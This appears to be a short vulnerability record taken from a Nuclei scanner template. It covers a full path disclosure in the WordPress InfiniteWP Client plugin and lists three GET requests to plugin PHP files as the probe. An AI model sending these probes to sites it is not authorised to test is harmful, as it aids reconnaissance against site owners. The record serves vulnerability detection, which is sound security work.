# Vulnerability: WordPress Plugin InfiniteWP Client - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-iwp-client-fpd.yaml`)

## Description
WordPress InfiniteWP Client plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/iwp-client/lib/IWPClass.php
GET {{BaseURL}}/wp-content/plugins/iwp-client/backup/backup.class.php
GET {{BaseURL}}/wp-content/plugins/iwp-client/lib/phpseclib/Crypt/AES.php
```

